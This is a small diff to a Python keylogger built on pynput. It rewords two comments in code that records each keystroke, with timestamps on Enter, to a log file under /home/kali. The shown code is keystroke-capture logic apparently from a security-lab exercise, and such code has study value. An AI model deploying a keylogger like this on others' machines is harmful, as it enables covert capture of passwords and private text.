@@ -2,7 +2,7 @@ from pynput import keyboard
 from datetime import datetime
 import os
 
-# Defines log path
+# Defines log path (Change it to desired)
 log_path = '/home/kali/log.txt'
 
 # Initializes array
@@ -21,7 +21,7 @@ def on_press(key):
 		if key == keyboard.Key.enter:
 			timestamp = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
 			array.append('[Key.enter]\n[{0}]'.format(timestamp))
-		# If it's space we append a space '
+		# If space key pressed then we append a space
 		elif key == keyboard.Key.space:
 			array.append(' ')
 		# Else we just append the key indicator
